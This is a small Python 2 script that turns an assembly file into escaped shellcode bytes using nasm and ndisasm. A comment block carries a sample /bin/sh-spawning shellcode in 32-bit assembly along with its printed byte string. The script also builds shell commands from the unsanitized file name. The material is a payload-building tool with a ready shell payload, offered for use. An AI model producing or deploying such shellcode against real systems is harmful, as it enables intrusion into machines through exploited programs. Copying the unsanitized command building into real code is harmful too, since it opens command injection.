#!/usr/bin/python
#Takes an .asm (assembly) file
#turns it into shellcode using 
#nasm, ndisasm.
#Requirements: nasm, ndisasm
#d3hydr8[at]gmail[dot]com

import sys, os, commands, getopt, StringIO, re

if len(sys.argv) != 2:
	print "\n\td3hydr8[at]gmail[dot]com asm2shell\n"
	print "Usage: ./asm2shell.py <asm file>"
	print "ex: ./asm2shell.py shellcode.asm"
	sys.exit(1)

asm = sys.argv[1]
x = "\\x"

try:
  	open(asm)
except(IOError), msg: 
  	print "Error:",msg
	print "Check your .asm file path.\n"
  	sys.exit(1)

os.popen('nasm '+asm)

dis = StringIO.StringIO(commands.getstatusoutput('ndisasm -u '+asm[:-4])[1]).readlines()
for line in dis:
	sets = re.split('(\w\w)',line[10:].split(" ")[0])
	for set in sets:
		if set != "": print x+set
	
'''
sh-3.00# cat /home/d3hydr8/shell.asm

BITS 32
jmp short       callme
main:
        pop     esi
        xor     eax,eax
        mov byte [esi+7],al
        lea     ebx,[esi+5]
        push    ebx
        lea     ebx,[esi]
        push    ebx
        mov     al,57
        push    eax
        int     0x80

callme:
        call    main
        db      '/bin/sh'
	   
sh-3.00# python asm2shell.py /home/d3hydr8/shell.asm
\xEB
\x12
\x5E
\x31
\xC0
\x88
\x46
\x07
\x8D
\x5E
\x05
\x53
\x8D
\x1E
\x53
\xB0
\x39
\x50
\xCD
\x80
\xE8
\xE9
\xFF
\xFF
\xFF
\x2F
\x62
\x69
\x6E
\x2F
\x73
\x68
sh-3.00#

'''
		
	 